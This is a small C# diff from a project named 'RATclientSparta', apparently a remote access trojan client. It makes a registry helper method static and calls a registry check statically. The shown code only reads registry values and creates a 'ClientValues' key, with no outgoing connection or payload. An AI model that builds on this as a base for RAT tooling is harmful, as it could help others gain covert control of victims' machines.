@@ -12,7 +12,7 @@ namespace RATclientSparta.Setup.RegistryData
         public string OpenedDate;
         public string OSVersion;
 
-        public dynamic Get(string key, string value)
+        public static dynamic Get(string key, string value)
         {
             return Registry.GetValue(key, value, "not exist"); //not exist = the value to return if the given value not exist
         }
@@ -20,8 +20,7 @@ namespace RATclientSparta.Setup.RegistryData
         public void GetClientData()
         {
             //If "OpenedAt" exist, then "OSVersion" also exist
-            RegistryCheck item = new RegistryCheck();
-            if (item.CheckIfExist("OpenedAt"))
+            if (RegistryCheck.CheckIfExist("OpenedAt"))
             {
                 using (RegistryKey a = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\ClientValues"))
                 {
